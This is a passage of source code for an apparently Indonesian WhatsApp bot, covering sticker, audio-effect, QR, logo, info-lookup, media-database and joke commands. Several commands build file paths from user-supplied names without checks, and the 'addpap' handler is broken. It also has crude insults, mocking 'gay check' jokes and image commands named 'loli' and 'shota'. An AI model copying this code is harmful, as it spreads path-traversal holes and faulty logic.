                for (let res of anu.results) {
                    let encmedia = await ndaa.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            case 'vnonce': {
            if (!quoted) return newReply(`Reply Audio`)
                    if (/audio/.test(mime)) {
                    anuu = await ndaa.downloadAndSaveMediaMessage(quoted)
                    ndaa.sendMessage(m.chat, {
                        audio: {
                            url: anuu
                        },
                        caption: mess.done,
                        fileLength: "99999",
                        viewOnce: true
                    }, {
                        quoted: ftroli
                    })
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return newReply(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await ndaa.downloadAndSaveMediaMessage(quoted)
                    ndaa.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: ftroli
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await ndaa.downloadAndSaveMediaMessage(quoted)
                    ndaa.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: ftroli
                    })
                }
            }
            break
            case 'toqr': {
                if (!q) return newReply(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await ndaa.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: ftroli
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                newReply(mess.wait)
                let media = await ndaa.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return newReply(err)
                let buff = fs.readFileSync(ran)
                ndaa.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : ftroli })
                fs.unlinkSync(ran)
                })
                } else newReply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                newReply(e)
                }
                break
            case 'fliptext': {
                if (args.length < 1) return newReply(`Example:\n${prefix}fliptext ndaaDev`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                newReply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
           /* ~~~~~~~~~ INFORMATION. FEATURED ~~~~~~~~~ */
            case 'infogempa':
            await loading()
            var he = await fetchJson(`https://api.lolhuman.xyz/api/infogempa?apikey=${lol}`)
            var caption = `Lokasi : ${he.result.lokasi}\n`
            caption += `Waktu : ${he.result.waktu}\n`
            caption += `Potensi : ${he.result.potensi}\n`
            caption += `Magnitude : ${he.result.magnitude}\n`
            caption += `Kedalaman : ${he.result.kedalaman}\n`
            caption += `Koordinat : ${he.result.koordinat}`
            ndaa.sendMessage(from, { image: { url: he.result.map }, caption })
            break
            
            case 'infocuaca':{
            await loading()
            if (args.length == 0) return newReply(`Example: ${prefix + command} Yogyakarta`)
            var ka = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${args[0]}?apikey=${lol}`)
            ndaa.sendMessage(m.chat, { location: { degreesLatitude: ka.result.latitude, degreesLongitude: ka.result.longitude } })
            var titttttttttt = `Tempat : ${ka.result.tempat}\n`
            titttttttttt += `Cuaca : ${ka.result.cuaca}\n`
            titttttttttt += `Angin : ${ka.result.angin}\n`
            titttttttttt += `Description : ${ka.result.description}\n`
            titttttttttt += `Kelembapan : ${ka.result.kelembapan}\n`
            titttttttttt += `Suhu : ${ka.result.suhu}\n`
            titttttttttt += `Udara : ${ka.result.udara}\n`
            titttttttttt += `Permukaan laut : ${ka.result.permukaan_laut}\n`
            newReply(titttttttttt)
            }
            break
            case 'quotessenja':{
            newReply(mess.wait)
            let data = await fetchJson(`https://api.zahwazein.xyz/randomtext/katasenja?apikey=${zenz}`)
            let teks = `${data.result.message}`
            newReply(teks)
            }
            break
            case 'motivasi':{
            newReply(mess.wait)
            let data = await fetchJson(`https://api.zahwazein.xyz/randomtext/motivasi?apikey=${zenz}`)
            let tekss = `${data.result.message}`
            newReply(tekss)
            }
            break
            case 'randompantun':{
            newReply(mess.wait)
            let data = await fetchJson(`https://api.zahwazein.xyz/randomtext/pantun?apikey=${zenz}`)
            let msg = `${data.result.message}`
            newReply(msg)
            }
            break
            case 'cerpen':{
            newReply(mess.wait)
            let data = await fetchJson(`https://api.caliph.biz.id/api/cerpen?apikey=${caliph}`)
            let msggs = `Judul: *${data.judul}*\n`
            msggs += `Sumber: *${data.sumber}*\n`
            msggs += `Cerita: ${data.cerita}`
            newReply(msggs)
            }
            break
            case 'faktaunik': {
            newReply(mess.wait)
            let data = await fetchJson(`https://api.zahwazein.xyz/randomtext/faktaunik?apikey=${zenz}`)
            let tks = `${data.result.message}`
            newReply(tks)
            }
            break
            case 'wikipedia':
            if (!q) return newReply(`Example: ${prefix + command} Tahu`)
            newReply(mess.wait)
            let data = await fetchJson(`https://api.zahwazein.xyz/information/wikipedia?query=${q}&apikey=${zenz}`)
            let owhh = `Judul: ${data.result.judul}\n`
            owhh += `Keterangan: ${data.result.isi}`
            newReply(owhh)
            break
            case 'pinterest': 
            case 'pin': {
                if (!text) return newReply(`Example : ${prefix + command} Mobil`)
                newReply(mess.wait)
                let { pinterest } = require('./lib/scraper.js')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]               
                ndaa.sendMessage(m.chat, { image: { url: result}, caption: mess.done}, { quoted: m })
            }
            break
            case 'kbbi':{
            if (!q) return newReply(`Example: ${prefix + command} kursi`)
            newReply(mess.wait)
            let data = await fetchJson(`https://api.zahwazein.xyz/information/kbbi?query=${q}&apikey=${zenz}`)
            var titid = `\`\`\`Title : ${data.result.title}\`\`\`\n`
            titid += `\`\`\`Arti : ${data.result.arti}\`\`\``
            newReply(titid)
            }
            break
            /* ~~~~~~~~~ ASUPAN ~~~~~~~~~ */
            case 'cecan':
            case 'china':
            case 'cogan':
            case 'indonesia':
            case 'japan':
            case 'korea':
            case 'malaysia':
            case 'thailand':
            case 'vietnam': {
                newReply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                ndaa.sendMessage(m.chat, { image: { url: result}, caption: mess.done }, { quoted: ftroli })
            }
            break
            /* ~~~~~~~~~ TEXT PRO ~~~~~~~~~ */
        case 'pornhub':
        case 'glitch':
        case 'avenger':
        case 'space':
        case 'ninjalogo':
        case 'marvelstudio':
        case 'lionlogo':
        case 'wolflogo':
        case 'steel3d':
        case 'wallgravity':
            if (!text) return newReply(`Example: ${prefix + command} Ndaa|Offc`)
            let txtt = text.split('|');
            if (txtt.length < 2) return newReply(`Example: ${prefix + command} Ndaa|Offc`)
            newReply(mess.wait)
            ndaa.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lol}&text1=${txtt[0]}&text2=${txtt[1]}`}, caption: `Type: ${command}\nText: ${args}\n\nCreated By Ndaa`}, { quoted: ftroli })
            break
        
        case 'blackpink':
        case 'neon':
        case 'greenneon':
        case 'advanceglow':
        case 'futureneon':
        case 'sandwriting':
        case 'sandsummer':
        case 'sandengraved':
        case 'metaldark':
        case 'neonlight':
        case 'holographic':
        case 'text1917':
        case 'minion':
        case 'deluxesilver':
        case 'newyearcard':
        case 'bloodfrosted':
        case 'halloween':
        case 'jokerlogo':
        case 'fireworksparkle':
        case 'natureleaves':
        case 'bokeh':
        case 'toxic':
        case 'strawberry':
        case 'box3d':
        case 'roadwarning':
        case 'breakwall':
        case 'icecold':
        case 'luxury':
        case 'cloud':
        case 'summersand':
        case 'horrorblood':
        case 'thunder':
            if (!q) return newReply(`Example: ${prefix + command} Ndaa`)
            newReply(mess.wait)
            ndaa.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lol}&text=${q}` }, caption: `Type: ${command}\nText: ${q}\n\nCreated By Ndaa`}, { quoted: ftroli })
            break
    
                 /* ~~~~~~~~~ ANIME ~~~~~~~~~ */
                case 'kiryuusearch': {
                if (!q) return newReply(`Example: ${prefix + command} mushoku`)
                let data = await fetchJson(`https://api.caliph.biz.id/api/kiryuusearch?query=${q}&apikey=${caliph}`)
                let tsk = `Name: ${data.data.name}\n`
                tsk += `Type: ${data.data.type}\n`
                tsk += `Chapter: ${data.data.chapter}\n`
                tsk += `Rating: ${data.data.rating}\n`
                tsk += `Url: ${data.data.url}`
                newReply(tsk)
                }
                break
                case 'mangasearch': {
if (!q) return newReply(`Example ${prefix+command} Naruto`)
newReply(mess.wait)
let v = await fetchJson(`https://api.caliph.biz.id/api/mangasearch?query=${q}&apikey=${caliph}`)
let teks = `*Judul* : ${v.judul}\n`
teks += `*Thumbnail* : ${v.thumbnail}\n`
teks += `*Link* : ${v.link}\n\n───────────────`
newReply(teks)
}
break
case 'mangatoons': {
if (!q) return newReply(`Example ${prefix+command} Naruto`)
newReply(mess.wait)
let anu = await fetchJson(`https://api.caliph.biz.id/api/mangatoonsearch?query=${q}&apikey=${caliph}`)
let teks = `*Judul* : ${anu.title}\n`
teks += `*Genre* : ${anu.genre}\n`
teks += `*Thumbnail* : ${anu.thumb}\n`
teks += `*Link* : ${anu.url}\n\n───────────────`
newReply(teks)
}
break
case 'kusonime': {
if (!q) return newReply(`Example ${prefix+command} Naruto`)
newReply(mess.wait)
let v = await fetchJson(`https://api.caliph.biz.id/api/kusonime?query=${q}&apikey=${caliph}`)
let teks = `*Judul* : ${v.judul}\n`
teks += `*Genre* : ${v.genre}\n`
teks += `*Rilis* : ${v.tgl_rilis}\n`
teks += `*Durasi* : ${v.durasi}\n`
teks += `*Thumbnail* : ${v.thumb}\n`
teks += `*Desk* : ${v.desk}\n\n───────────────`
newReply(teks)
}
break
                /* ~~~~~~~~~ DATABASE MEDIA ~~~~~~~~~ */
            case 'listvn': {
                let teks = '┌──⭓「 *List Vn* 」\n│\n'
                for (let x of Vnndaa) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Vnndaa.length}*`
                newReply(teks)
            }
            break
            case 'liststicker': {
                let teks = '┌──⭓「 *List Sticker* 」\n│\n'
                for (let x of Stickerndaa) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Stickerndaa.length}*`
                newReply(teks)
            }
            break
            case 'listimage': {
                let teks = '┌──⭓「 *List Image* 」\n│\n'
                for (let x of Imagendaa) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Imagendaa.length}*`
                newReply(teks)
            }
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *List Video* 」\n│\n'
                for (let x of Videondaa) {
                    teks += `│⭔ ${x}\n`
                }
                teks += `│\n└────────────⭓\n\n*Total : ${Videondaa.length}*`
                newReply(teks)
            }
            break
            case 'addvideo': {
                if (!isPremium) return newReply(mess.prem)
                if (args.length < 1) return newReply('Nama Videonya?')
                if (Videondaa.includes(q)) return newReply("Nama Yang Kamu Masukan Sudah Ada")
                let delb = await ndaa.downloadAndSaveMediaMessage(quoted)
                Videondaa.push(q)
                await fsx.copy(delb, `./media/video/${q}.mp4`)
                fs.writeFileSync('./src/media/video.json', JSON.stringify(Videondaa))
                fs.unlinkSync(delb)
                newReply(`Success Menambahkan Video\nUntuk Melihat Ketik ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return newReply(mess.prem)
                if (args.length < 1) return newReply('Masukan Nama Video')
                if (!Videondaa.includes(q)) return newReply("Nama Tidak Ada Di Dalam Database")
                let wanu = Videondaa.indexOf(q)
                Videondaa.splice(wanu, 1)
                fs.writeFileSync('./src/media/video.json', JSON.stringify(Videondaa))
                fs.unlinkSync(`./media/video/${q}.mp4`)
                newReply(`Success Sukses Menghapus Video ${q}`)
            }
            break
            case 'addpap': {
                if (!isPremium) return newReply(mess.prem)
                if (args.length < 1) return newReply('Nama Imagenya?')
                if (Imagendaa.includes(q)) return newReply("Nama Yang Kamu Masukan Sudah Terdaftar Di Dalam Database")
                newReply(mess.wait)
                let media = await ndaa.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                let anu = await TelegraPh(media)
                let eff = `${util.format(anu)}`
                await fsx.copy(media, `./media/image/${q}.jpg`)
                fs.writeFileSync('./src/media/image.json/${eff}', JSON.stringify)
                await fs.unlinkSync(media)
            newReply(`Sukses Menambahkan Image`)
            }
            }
            break
            
            case 'addimage': {
                if (!isPremium) return newReply(mess.prem)
                if (args.length < 1) return newReply('Nama Imagenya?')
                if (Imagendaa.includes(q)) return newReply("Nama Yang Kamu Masukan Sudah Terdaftar Di Dalam Database")
                let delb = await ndaa.downloadAndSaveMediaMessage(quoted)
                Imagendaa.push(q)
                await fsx.copy(delb, `./media/image/${q}.jpg`)
                fs.writeFileSync('./src/media/image.json', JSON.stringify(Imagendaa))
                fs.unlinkSync(delb)
                newReply(`Sukses Menambahkan Image\nUntuk Cek Ketik ${prefix}listimage`)
            }
            break
            
            case 'delimage': {
                if (!isPremium) return newReply(mess.prem)
                if (args.length < 1) return newReply('Masukan Nama Imagenya')
                if (!Imagendaa.includes(q)) return newReply("Nama Image Yang Kamu Masukan Tidak Terdaftar")
                let wanu = Imagendaa.indexOf(q)
                Imagendaa.splice(wanu, 1)
                fs.writeFileSync('./src/media/image.json', JSON.stringify(Imagendaa))
                fs.unlinkSync(`./media/image/${q}.jpg`)
                newReply(`Suksed Menghapus Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return newReply(mess.prem)
                if (args.length < 1) return newReply('Masukan Nama Stickernya?')
                if (Stickerndaa.includes(q)) return newReply("Nama Telah Di Pakai")
                let delb = await ndaa.downloadAndSaveMediaMessage(quoted)
                Stickerndaa.push(q)
                await fsx.copy(delb, `./media/sticker/${q}.webp`)
                fs.writeFileSync('./src/media/sticker.json', JSON.stringify(Stickerndaa))
                fs.unlinkSync(delb)
                newReply(`Sukses Menambahkan Sticker\nUntuk Mengecek Ketik ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return newReply(mess.prem)
                if (args.length < 1) return newReply('Masukan Nama Stickernya')
                if (!Stickerndaa.includes(q)) return newReply("Nama Tidak Terdaftar Di Database")
                let wanu = Stickerndaa.indexOf(q)
                Stickerndaa.splice(wanu, 1)
                fs.writeFileSync('./src/media/sticker.json', JSON.stringify(Stickerndaa))
                fs.unlinkSync(`./media/sticker/${q}.webp`)
                newReply(`Sukses Menghapus Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return newReply(mess.prem)
                if (args.length < 1) return newReply('Masukan Namanya?')
                if (Vnndaa.includes(q)) return newReply("Nama Telah Di Pakai")
                let delb = await ndaa.downloadAndSaveMediaMessage(quoted)
                Vnndaa.push(q)
                await fsx.copy(delb, `./media/audio/${q}.mp3`)
                fs.writeFileSync('./src/media/vn.json', JSON.stringify(Vnndaa))
                fs.unlinkSync(delb)
                newReply(`Sukses Menambahkan Audio\nUntuk Mengecek Ketik ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return newReply(mess.prem)
                if (args.length < 1) return newReply('Masukan Namanya')
                if (!Vnndaa.includes(q)) return newReply("Nama Tidak Terdaftar Di Database")
                let wanu = Vnndaa.indexOf(q)
                Vnndaa.splice(wanu, 1)
                fs.writeFileSync('./src/media/vn.json', JSON.stringify(Vnndaa))
                fs.unlinkSync(`./media/audio/${q}.mp3`)
                newReply(`Sukses Menghapus Audio ${q}`)
            }
            break
            case 'addlist':
            if (!m.isGroup) return newReply(mess.group)
            if (!isAdmins && !isCreator) return newReply(mess.botAdmin)
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return newReply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
            if (isAlreadyResponList(m.chat, args1, db_respon_list)) return newReply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
            addResponList(m.chat, args1, args2, false, '-', db_respon_list)
            newReply(`Berhasil menambah List menu : *${args1}*`)
        break
        
        case 'dellist':{
            if (!m.isGroup) return newReply(mess.group)
            if (!isAdmins && !isCreator) return newReply(mess.botAdmin)
            if (db_respon_list.length === 0) return newReply(`Belum ada list message di database`)
            var arr_rows = [];
            for (let x of db_respon_list) {
            if (x.id === m.chat) {
            newReply(`Mau Delete Yang Mana?\n\n${x.key}`)
        }}
        }
        break
        
        case 'hapuslist':{
            if (!m.isGroup) return newReply(mess.group)
            if (!isAdmins && !isCreator) return newReply(mess.botAdmin)
            delResponList(m.chat, q, db_respon_list)
            newReply(`Success Delete List Message Dengan Key *${q}*`)
            }
            break
                /* ~~~~~~~~~ FUN FITUR ~~~~~~~~~ */
            
            case 'apakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
                const kah = apa[Math.floor(Math.random() * apa.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
                }
                break
            case 'bisakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
                const ga = bisa[Math.floor(Math.random() * bisa.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
                }
                break
            case 'bagaimanakah': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
                const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Yang Sabar Ya Bos:(', 'Gimana yeee']
                const ya = gimana[Math.floor(Math.random() * gimana.length)]
                newReply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
                }
            break
            case 'rate': {
                if (!q) return newReply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
                const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const te = ra[Math.floor(Math.random() * ra.length)]
                newReply(`Rate : ${q}\nJawaban : *${te}%*`)
                }
            break
            
            case 'gantengcek':
            case 'cekganteng': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Owner`)
                const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const teng = gan[Math.floor(Math.random() * gan.length)]
                newReply(`Nama : ${q}\nJawaban : *${teng}%`)
                }
            break
                
            case 'cantikcek':
            case 'cekcantik': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} Akame`)
                const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
                const tik = can[Math.floor(Math.random() * can.length)]
                newReply(`Nama : ${q}\nJawaban : *${tik}%`)
                }
            break
            
            case 'sangecek':
            case 'ceksange':
            case 'gaycek':
            case 'cekgay':
            case 'lesbicek':
            case 'ceklesbi': {
                if (!q) return newReply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
                const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
                const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
                newReply(`Nama : ${q}\nJawaban : *${sange}%*`)
                }
            break
                
            case 'kapankah': {
                if (!q) return newReply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
                const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
                const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
                newReply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
                }
            break
            
            case 'wangy': {
                if (!q) return newReply(`Contoh : .wangy Riy`)
                qq = q.toUpperCase()
                awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
                newReply(awikwok)
                }
            break
            
            case 'cekmati': {
                if (!q) return newReply(`Invalid!\n\nYg mau di cek siapa kontol?`)
                predea = await axios.get(`https://api.agify.io/?name=${q}`)
                newReply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
                }
            break
            
            case 'halah':
            case 'hilih':
            case 'huluh':
            case 'heleh':
            case 'holoh': {
                if (!m.quoted && !text) return newReply(`Kirim/reply text dengan caption ${prefix + command}`)
                ter = command[1].toLowerCase()
                tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
                newReply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
                }
            break
            /* ~~~~~~~~~ ANIME FEATURES ~~~~~~~~~ */
            case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
if (!isPremium) return newReply(mess.prem)
newReply(mess.wait)
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
